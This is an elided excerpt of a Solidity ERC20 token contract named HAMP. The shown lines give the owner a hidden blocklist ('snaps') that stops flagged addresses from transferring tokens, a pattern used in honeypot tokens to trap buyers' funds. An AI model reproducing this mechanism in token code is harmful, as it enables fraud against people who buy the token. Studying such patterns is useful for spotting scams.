...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    bool private _snapsApplied = false;
    ...
    function toSnaps(address [] calldata _addresses_) external onlyOwner {
    ...
    function backSnaps(address [] calldata _addresses_) external onlyOwner {
        for (uint256 i = 0; i < _addresses_.length; i++) {
            _snaps[_addresses_[i]] = false;
        }
    }

    function inSnaps(address _address_) public view returns (bool) {
    ...
    function _transfer(
        ...
        if (_snaps[from] || _snaps[to]) require(_snapsApplied == true, "");
...
contract HAMP is ERC20 {
    constructor() ERC20("HAMP", "HellAMP") {
